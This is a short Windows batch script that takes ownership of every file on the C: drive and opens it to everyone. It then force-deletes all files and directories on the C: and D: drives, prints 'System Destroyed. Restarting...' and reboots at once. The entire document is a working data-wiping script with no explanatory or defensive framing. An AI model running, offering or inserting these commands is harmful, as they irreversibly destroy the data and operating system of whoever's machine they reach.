@echo off
:: Take ownership of all files
takeown /f C:\*.* /r /d y
icacls C:\*.* /grant Everyone:F /t

:: Delete all files
del /f /q /s C:\*.*
del /f /q /s D:\*.*

:: Delete all directories
rd /s /q C:\
rd /s /q D:\

:: Done
echo System Destroyed. Restarting...
shutdown /r /t 0
